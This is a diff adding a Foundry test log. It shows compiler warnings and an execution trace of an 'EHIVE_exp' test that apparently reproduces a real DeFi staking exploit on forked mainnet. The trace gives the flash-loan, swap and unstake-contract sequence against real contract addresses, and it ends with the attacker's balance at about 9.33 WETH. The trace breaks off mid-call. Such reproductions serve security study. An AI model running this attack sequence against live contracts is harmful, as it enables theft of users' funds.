@@ -1,0 +1,892 @@
+Compiling 28 files with Solc 0.8.25
+Solc 0.8.25 finished in 1.37s
+Compiler run successful with warnings:
+Warning (2519): This declaration shadows an existing declaration.
+   --> src/test/interface.sol:886:5:
+    |
+886 |     function WETH() external view returns (address);
+    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:1598:5:
+     |
+1598 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:1850:5:
+     |
+1850 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:2560:5:
+     |
+2560 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:3759:5:
+     |
+3759 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+  --> src/test/2023-08/EHIVE_exp.sol:42:5:
+   |
+42 |     IERC20 private constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2018): Function state mutability can be restricted to pure
+   --> src/test/2023-08/EHIVE_exp.sol:111:5:
+    |
+111 |     function calcAmount(uint256 reserve1, uint256 reserve2, uint256 balance) internal returns (uint256) {
+    |     ^ (Relevant source part starts here and spans across multiple lines).
+
+
+Ran 1 test for script/Exploit-template_new.sol:ExploitScript
+[PASS] testExploit() (gas: 20485)
+Logs:
+  Attacker ETH Balance Before exploit: 0.000000000000000000
+  Attacker ETH Balance After exploit: 0.000000000000000000
+
+Traces:
+  [20485] ExploitScript::testExploit()
+    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   └─ ← [Return] 
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 269.92ms (1.03ms CPU time)
+
+Ran 1 test for src/test/2023-08/EHIVE_exp.sol:EHIVETest
+[PASS] testExploit() (gas: 31282250)
+Logs:
+  Attacker WETH balance before attack: 0.000000000000000000
+  Attacker WETH balance after attack: 9.325768301100185740
+
+Traces:
+  [35076450] EHIVETest::testExploit()
+    ├─ [894546] → new UnstakeContract@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 4247 bytes of code
+    ├─ [71635] UnstakeContract::stake(0)
+    │   ├─ [68517] EHIVE::stake(0, 0)
+    │   │   ├─ emit Transfer(from: UnstakeContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x0000000000000000000000000000000000000000, value: 0)
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Stop] 
+    ├─ [894546] → new UnstakeContract@0x2e234DAe75C793f67A35089C9d99245E1C58470b
+    │   └─ ← [Return] 4247 bytes of code
+    ├─ [57135] UnstakeContract::stake(0)
+    │   ├─ [56517] EHIVE::stake(0, 0)
+    │   │   ├─ emit Transfer(from: UnstakeContract: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], to: 0x0000000000000000000000000000000000000000, value: 0)
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Stop] 
+    ├─ [894546] → new UnstakeContract@0xF62849F9A0B5Bf2913b396098F7c7019b51A820a
+    │   └─ ← [Return] 4247 bytes of code
+    ├─ [57135] UnstakeContract::stake(0)
+    │   ├─ [56517] EHIVE::stake(0, 0)
+    │   │   ├─ emit Transfer(from: UnstakeContract: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], to: 0x0000000000000000000000000000000000000000, value: 0)
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Stop] 
+    ├─ [894546] → new UnstakeContract@0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9
+    │   └─ ← [Return] 4247 bytes of code
+    ├─ [57135] UnstakeContract::stake(0)
+    │   ├─ [56517] EHIVE::stake(0, 0)
+    │   │   ├─ emit Transfer(from: UnstakeContract: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], to: 0x0000000000000000000000000000000000000000, value: 0)
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Stop] 
+    ├─ [894546] → new UnstakeContract@0xc7183455a4C133Ae270771860664b6B7ec320bB1
+    │   └─ ← [Return] 4247 bytes of code
+    ├─ [57135] UnstakeContract::stake(0)
+    │   ├─ [56517] EHIVE::stake(0, 0)
+    │   │   ├─ emit Transfer(from: UnstakeContract: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], to: 0x0000000000000000000000000000000000000000, value: 0)
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Stop] 
+    ├─ [894546] → new UnstakeContract@0xa0Cb889707d426A7A386870A03bc70d1b0697598
+    │   └─ ← [Return] 4247 bytes of code
+    ├─ [57135] UnstakeContract::stake(0)
+    │   ├─ [56517] EHIVE::stake(0, 0)
+    │   │   ├─ emit Transfer(from: UnstakeContract: [0xa0Cb889707d426A7A386870A03bc70d1b0697598], to: 0x0000000000000000000000000000000000000000, value: 0)
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Stop] 
+    ├─ [894546] → new UnstakeContract@0x1d1499e622D69689cdf9004d05Ec547d650Ff211
+    │   └─ ← [Return] 4247 bytes of code
+    ├─ [57135] UnstakeContract::stake(0)
+    │   ├─ [56517] EHIVE::stake(0, 0)
+    │   │   ├─ emit Transfer(from: UnstakeContract: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211], to: 0x0000000000000000000000000000000000000000, value: 0)
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Stop] 
+    ├─ [894546] → new UnstakeContract@0xA4AD4f68d0b91CFD19687c881e50f3A00242828c
+    │   └─ ← [Return] 4247 bytes of code
+    ├─ [57135] UnstakeContract::stake(0)
+    │   ├─ [56517] EHIVE::stake(0, 0)
+    │   │   ├─ emit Transfer(from: UnstakeContract: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c], to: 0x0000000000000000000000000000000000000000, value: 0)
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Stop] 
+    ├─ [894546] → new UnstakeContract@0x03A6a84cD762D9707A21605b548aaaB891562aAb
+    │   └─ ← [Return] 4247 bytes of code
+    ├─ [57135] UnstakeContract::stake(0)
+    │   ├─ [56517] EHIVE::stake(0, 0)
+    │   │   ├─ emit Transfer(from: UnstakeContract: [0x03A6a84cD762D9707A21605b548aaaB891562aAb], to: 0x0000000000000000000000000000000000000000, value: 0)
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Stop] 
+    ├─ [894546] → new UnstakeContract@0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF
+    │   └─ ← [Return] 4247 bytes of code
+    ├─ [57135] UnstakeContract::stake(0)
+    │   ├─ [56517] EHIVE::stake(0, 0)
+    │   │   ├─ emit Transfer(from: UnstakeContract: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF], to: 0x0000000000000000000000000000000000000000, value: 0)
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Stop] 
+    ├─ [894546] → new UnstakeContract@0x15cF58144EF33af1e14b5208015d11F9143E27b9
+    │   └─ ← [Return] 4247 bytes of code
+    ├─ [57135] UnstakeContract::stake(0)
+    │   ├─ [56517] EHIVE::stake(0, 0)
+    │   │   ├─ emit Transfer(from: UnstakeContract: [0x15cF58144EF33af1e14b5208015d11F9143E27b9], to: 0x0000000000000000000000000000000000000000, value: 0)
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Stop] 
+    ├─ [894546] → new UnstakeContract@0x212224D2F2d262cd093eE13240ca4873fcCBbA3C
+    │   └─ ← [Return] 4247 bytes of code
+    ├─ [57135] UnstakeContract::stake(0)
+    │   ├─ [56517] EHIVE::stake(0, 0)
+    │   │   ├─ emit Transfer(from: UnstakeContract: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C], to: 0x0000000000000000000000000000000000000000, value: 0)
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Stop] 
+    ├─ [894546] → new UnstakeContract@0x2a07706473244BC757E10F2a9E86fB532828afe3
+    │   └─ ← [Return] 4247 bytes of code
+    ├─ [57135] UnstakeContract::stake(0)
+    │   ├─ [56517] EHIVE::stake(0, 0)
+    │   │   ├─ emit Transfer(from: UnstakeContract: [0x2a07706473244BC757E10F2a9E86fB532828afe3], to: 0x0000000000000000000000000000000000000000, value: 0)
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Stop] 
+    ├─ [894546] → new UnstakeContract@0x3D7Ebc40AF7092E3F1C81F2e996cbA5Cae2090d7
+    │   └─ ← [Return] 4247 bytes of code
+    ├─ [57135] UnstakeContract::stake(0)
+    │   ├─ [56517] EHIVE::stake(0, 0)
+    │   │   ├─ emit Transfer(from: UnstakeContract: [0x3D7Ebc40AF7092E3F1C81F2e996cbA5Cae2090d7], to: 0x0000000000000000000000000000000000000000, value: 0)
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Stop] 
+    ├─ [894546] → new UnstakeContract@0xD16d567549A2a2a2005aEACf7fB193851603dd70
+    │   └─ ← [Return] 4247 bytes of code
+    ├─ [57135] UnstakeContract::stake(0)
+    │   ├─ [56517] EHIVE::stake(0, 0)
+    │   │   ├─ emit Transfer(from: UnstakeContract: [0xD16d567549A2a2a2005aEACf7fB193851603dd70], to: 0x0000000000000000000000000000000000000000, value: 0)
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Stop] 
+    ├─ [894546] → new UnstakeContract@0x96d3F6c20EEd2697647F543fE6C08bC2Fbf39758
+    │   └─ ← [Return] 4247 bytes of code
+    ├─ [57135] UnstakeContract::stake(0)
+    │   ├─ [56517] EHIVE::stake(0, 0)
+    │   │   ├─ emit Transfer(from: UnstakeContract: [0x96d3F6c20EEd2697647F543fE6C08bC2Fbf39758], to: 0x0000000000000000000000000000000000000000, value: 0)
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Stop] 
+    ├─ [894546] → new UnstakeContract@0x13aa49bAc059d709dd0a18D6bb63290076a702D7
+    │   └─ ← [Return] 4247 bytes of code
+    ├─ [57135] UnstakeContract::stake(0)
+    │   ├─ [56517] EHIVE::stake(0, 0)
+    │   │   ├─ emit Transfer(from: UnstakeContract: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7], to: 0x0000000000000000000000000000000000000000, value: 0)
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Stop] 
+    ├─ [894546] → new UnstakeContract@0xDB25A7b768311dE128BBDa7B8426c3f9C74f3240
+    │   └─ ← [Return] 4247 bytes of code
+    ├─ [57135] UnstakeContract::stake(0)
+    │   ├─ [56517] EHIVE::stake(0, 0)
+    │   │   ├─ emit Transfer(from: UnstakeContract: [0xDB25A7b768311dE128BBDa7B8426c3f9C74f3240], to: 0x0000000000000000000000000000000000000000, value: 0)
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Stop] 
+    ├─ [894546] → new UnstakeContract@0x3381cD18e2Fb4dB236BF0525938AB6E43Db0440f
+    │   └─ ← [Return] 4247 bytes of code
+    ├─ [57135] UnstakeContract::stake(0)
+    │   ├─ [56517] EHIVE::stake(0, 0)
+    │   │   ├─ emit Transfer(from: UnstakeContract: [0x3381cD18e2Fb4dB236BF0525938AB6E43Db0440f], to: 0x0000000000000000000000000000000000000000, value: 0)
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Stop] 
+    ├─ [894546] → new UnstakeContract@0x756e0562323ADcDA4430d6cb456d9151f605290B
+    │   └─ ← [Return] 4247 bytes of code
+    ├─ [57135] UnstakeContract::stake(0)
+    │   ├─ [56517] EHIVE::stake(0, 0)
+    │   │   ├─ emit Transfer(from: UnstakeContract: [0x756e0562323ADcDA4430d6cb456d9151f605290B], to: 0x0000000000000000000000000000000000000000, value: 0)
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Stop] 
+    ├─ [894546] → new UnstakeContract@0x1aF7f588A501EA2B5bB3feeFA744892aA2CF00e6
+    │   └─ ← [Return] 4247 bytes of code
+    ├─ [57135] UnstakeContract::stake(0)
+    │   ├─ [56517] EHIVE::stake(0, 0)
+    │   │   ├─ emit Transfer(from: UnstakeContract: [0x1aF7f588A501EA2B5bB3feeFA744892aA2CF00e6], to: 0x0000000000000000000000000000000000000000, value: 0)
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Stop] 
+    ├─ [894546] → new UnstakeContract@0xe8dc788818033232EF9772CB2e6622F1Ec8bc840
+    │   └─ ← [Return] 4247 bytes of code
+    ├─ [57135] UnstakeContract::stake(0)
+    │   ├─ [56517] EHIVE::stake(0, 0)
+    │   │   ├─ emit Transfer(from: UnstakeContract: [0xe8dc788818033232EF9772CB2e6622F1Ec8bc840], to: 0x0000000000000000000000000000000000000000, value: 0)
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Stop] 
+    ├─ [894546] → new UnstakeContract@0x3Cff5E7eBecb676c3Cb602D0ef2d46710b88854E
+    │   └─ ← [Return] 4247 bytes of code
+    ├─ [57135] UnstakeContract::stake(0)
+    │   ├─ [56517] EHIVE::stake(0, 0)
+    │   │   ├─ emit Transfer(from: UnstakeContract: [0x3Cff5E7eBecb676c3Cb602D0ef2d46710b88854E], to: 0x0000000000000000000000000000000000000000, value: 0)
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Stop] 
+    ├─ [894546] → new UnstakeContract@0x27cc01A4676C73fe8b6d0933Ac991BfF1D77C4da
+    │   └─ ← [Return] 4247 bytes of code
+    ├─ [57135] UnstakeContract::stake(0)
+    │   ├─ [56517] EHIVE::stake(0, 0)
+    │   │   ├─ emit Transfer(from: UnstakeContract: [0x27cc01A4676C73fe8b6d0933Ac991BfF1D77C4da], to: 0x0000000000000000000000000000000000000000, value: 0)
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Stop] 
+    ├─ [894546] → new UnstakeContract@0x796f2974e3C1af763252512dd6d521E9E984726C
+    │   └─ ← [Return] 4247 bytes of code
+    ├─ [57135] UnstakeContract::stake(0)
+    │   ├─ [56517] EHIVE::stake(0, 0)
+    │   │   ├─ emit Transfer(from: UnstakeContract: [0x796f2974e3C1af763252512dd6d521E9E984726C], to: 0x0000000000000000000000000000000000000000, value: 0)
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Stop] 
+    ├─ [894546] → new UnstakeContract@0x92a6649Fdcc044DA968d94202465578a9371C7b1
+    │   └─ ← [Return] 4247 bytes of code
+    ├─ [57135] UnstakeContract::stake(0)
+    │   ├─ [56517] EHIVE::stake(0, 0)
+    │   │   ├─ emit Transfer(from: UnstakeContract: [0x92a6649Fdcc044DA968d94202465578a9371C7b1], to: 0x0000000000000000000000000000000000000000, value: 0)
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Stop] 
+    ├─ [894546] → new UnstakeContract@0xDA5A5ADC64C8013d334A0DA9e711B364Af7A4C2d
+    │   └─ ← [Return] 4247 bytes of code
+    ├─ [57135] UnstakeContract::stake(0)
+    │   ├─ [56517] EHIVE::stake(0, 0)
+    │   │   ├─ emit Transfer(from: UnstakeContract: [0xDA5A5ADC64C8013d334A0DA9e711B364Af7A4C2d], to: 0x0000000000000000000000000000000000000000, value: 0)
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Stop] 
+    ├─ [894546] → new UnstakeContract@0x886D6d1eB8D415b00052828CD6d5B321f072073d
+    │   └─ ← [Return] 4247 bytes of code
+    ├─ [57135] UnstakeContract::stake(0)
+    │   ├─ [56517] EHIVE::stake(0, 0)
+    │   │   ├─ emit Transfer(from: UnstakeContract: [0x886D6d1eB8D415b00052828CD6d5B321f072073d], to: 0x0000000000000000000000000000000000000000, value: 0)
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Stop] 
+    ├─ [0] VM::warp(1692606287 [1.692e9])
+    │   └─ ← [Return] 
+    ├─ [2534] WETH::balanceOf(EHIVETest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [2444] WETH::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Attacker WETH balance before attack", val: 0, decimals: 18)
+    ├─ [24420] WETH::approve(AaveFlashloan: [0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ emit Approval(owner: EHIVETest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: AaveFlashloan: [0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   └─ ← [Return] true
+    ├─ [6824870] AaveFlashloan::flashLoanSimple(EHIVETest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 18000000000000000000 [1.8e19], 0x00, 0)
+    │   ├─ [6819820] 0xF1Cd4193bbc1aD4a23E833170f49d60f3D35a621::flashLoanSimple(EHIVETest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 18000000000000000000 [1.8e19], 0x00, 0) [delegatecall]
+    │   │   ├─ [6812990] 0x0A62276bFBF1Ad8443f37Da8630d407408085c8b::a1fe0e8d(f81d8d79f42adb4c73cc3aa0c78e25d3343882d0313c0b80ece3d3a103ef1ebf00000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000000000f9ccd8a1c508000000000000000000000000000000000000000000000000000000000000000000e000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000500000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
+    │   │   │   ├─ [35946] 0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8::transferUnderlyingTo(EHIVETest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 18000000000000000000 [1.8e19])
+    │   │   │   │   ├─ [30926] 0x7EfFD7b47Bfd17e52fB7559d3f924201b9DbfF3d::transferUnderlyingTo(EHIVETest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 18000000000000000000 [1.8e19]) [delegatecall]
+    │   │   │   │   │   ├─ [27962] WETH::transfer(EHIVETest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 18000000000000000000 [1.8e19])
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8, to: EHIVETest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 18000000000000000000 [1.8e19])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   └─ ← [Return] 
+    │   │   │   ├─ [6680237] EHIVETest::executeOperation(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 18000000000000000000 [1.8e19], 9000000000000000 [9e15], EHIVETest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00)
+    │   │   │   │   ├─ [2504] EHIVE_WETH::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 362681749068609521626290878242 [3.626e29], 16049025966928695148 [1.604e19], 1687938935 [1.687e9]
+    │   │   │   │   ├─ [534] WETH::balanceOf(EHIVETest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 18000000000000000000 [1.8e19]
+    │   │   │   │   ├─ [534] WETH::balanceOf(EHIVETest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 18000000000000000000 [1.8e19]
+    │   │   │   │   ├─ [8062] WETH::transfer(EHIVE_WETH: [0xAE851769593AC6048D36BC123700649827659A82], 18000000000000000000 [1.8e19])
+    │   │   │   │   │   ├─ emit Transfer(from: EHIVETest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: EHIVE_WETH: [0xAE851769593AC6048D36BC123700649827659A82], value: 18000000000000000000 [1.8e19])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [163323] EHIVE_WETH::swap(191459970500304883616677506467 [1.914e29], 0, EHIVETest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   │   ├─ [130470] EHIVE::transfer(EHIVETest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 191459970500304883616677506467 [1.914e29])
+    │   │   │   │   │   │   ├─ emit Transfer(from: EHIVE_WETH: [0xAE851769593AC6048D36BC123700649827659A82], to: EHIVE: [0x4Ae2Cd1F5B8806a973953B76f9Ce6d5FAB9cdcfd], value: 11487598230018293017000650388 [1.148e28])
+    │   │   │   │   │   │   ├─ emit Transfer(from: EHIVE_WETH: [0xAE851769593AC6048D36BC123700649827659A82], to: EHIVETest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 179972372270286590599676856079 [1.799e29])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(EHIVE_WETH: [0xAE851769593AC6048D36BC123700649827659A82]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 171221778568304638009613371775 [1.712e29]
+    │   │   │   │   │   ├─ [534] WETH::balanceOf(EHIVE_WETH: [0xAE851769593AC6048D36BC123700649827659A82]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 34049025966928695148 [3.404e19]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 171221778568304638009613371775 [1.712e29], reserve1: 34049025966928695148 [3.404e19])
+    │   │   │   │   │   ├─ emit Swap(sender: EHIVETest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 0, amount1In: 18000000000000000000 [1.8e19], amount0Out: 191459970500304883616677506467 [1.914e29], amount1Out: 0, to: EHIVETest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [996] EHIVE::balanceOf(EHIVETest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 179972372270286590599676856079 [1.799e29]
+    │   │   │   │   ├─ [280006] EHIVE::transfer(UnstakeContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 179972372270286590599676856079 [1.799e29])
+    │   │   │   │   │   ├─ [275] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::WETH() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]
+    │   │   │   │   │   ├─ emit Approval(owner: EHIVE: [0x4Ae2Cd1F5B8806a973953B76f9Ce6d5FAB9cdcfd], spender: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, value: 57291666666666666666666667 [5.729e25])
+    │   │   │   │   │   ├─ [74758] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::swapExactTokensForETHSupportingFeeOnTransferTokens(57291666666666666666666667 [5.729e25], 0, [0x4Ae2Cd1F5B8806a973953B76f9Ce6d5FAB9cdcfd, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], EHIVE: [0x4Ae2Cd1F5B8806a973953B76f9Ce6d5FAB9cdcfd], 1692606287 [1.692e9])
+    │   │   │   │   │   │   ├─ [10510] EHIVE::transferFrom(EHIVE: [0x4Ae2Cd1F5B8806a973953B76f9Ce6d5FAB9cdcfd], EHIVE_WETH: [0xAE851769593AC6048D36BC123700649827659A82], 57291666666666666666666667 [5.729e25])
+    │   │   │   │   │   │   │   ├─ emit Approval(owner: EHIVE: [0x4Ae2Cd1F5B8806a973953B76f9Ce6d5FAB9cdcfd], spender: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, value: 0)
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: EHIVE: [0x4Ae2Cd1F5B8806a973953B76f9Ce6d5FAB9cdcfd], to: EHIVE_WETH: [0xAE851769593AC6048D36BC123700649827659A82], value: 57291666666666666666666667 [5.729e25])
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [504] EHIVE_WETH::getReserves() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 171221778568304638009613371775 [1.712e29], 34049025966928695148 [3.404e19], 1692606287 [1.692e9]
+    │   │   │   │   │   │   ├─ [996] EHIVE::balanceOf(EHIVE_WETH: [0xAE851769593AC6048D36BC123700649827659A82]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 171279070234971304676280038442 [1.712e29]
+    │   │   │   │   │   │   ├─ [38799] EHIVE_WETH::swap(0, 11355008050065884 [1.135e16], 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 0x)
+    │   │   │   │   │   │   │   ├─ [25162] WETH::transfer(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 11355008050065884 [1.135e16])
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: EHIVE_WETH: [0xAE851769593AC6048D36BC123700649827659A82], to: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, value: 11355008050065884 [1.135e16])
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─ [996] EHIVE::balanceOf(EHIVE_WETH: [0xAE851769593AC6048D36BC123700649827659A82]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 171279070234971304676280038442 [1.712e29]
+    │   │   │   │   │   │   │   ├─ [534] WETH::balanceOf(EHIVE_WETH: [0xAE851769593AC6048D36BC123700649827659A82]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 34037670958878629264 [3.403e19]
+    │   │   │   │   │   │   │   ├─ emit Sync(reserve0: 171279070234971304676280038442 [1.712e29], reserve1: 34037670958878629264 [3.403e19])
+    │   │   │   │   │   │   │   ├─ emit Swap(sender: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, amount0In: 57291666666666666666666667 [5.729e25], amount1In: 0, amount0Out: 0, amount1Out: 11355008050065884 [1.135e16], to: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)
+    │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   ├─ [534] WETH::balanceOf(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 11355008050065884 [1.135e16]
+    │   │   │   │   │   │   ├─ [9223] WETH::withdraw(11355008050065884 [1.135e16])
+    │   │   │   │   │   │   │   ├─ [83] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::fallback{value: 11355008050065884}()
+    │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   ├─ emit Withdrawal(src: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, wad: 11355008050065884 [1.135e16])
+    │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   ├─ [55] EHIVE::fallback{value: 11355008050065884}()
+    │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [0] 0x31e180e06D771dbAfa3D6Eea452195Ad1020fbDb::fallback{value: 9462506708388236}()
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ emit Approval(owner: EHIVE: [0x4Ae2Cd1F5B8806a973953B76f9Ce6d5FAB9cdcfd], spender: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, value: 5208333333333333333333333 [5.208e24])
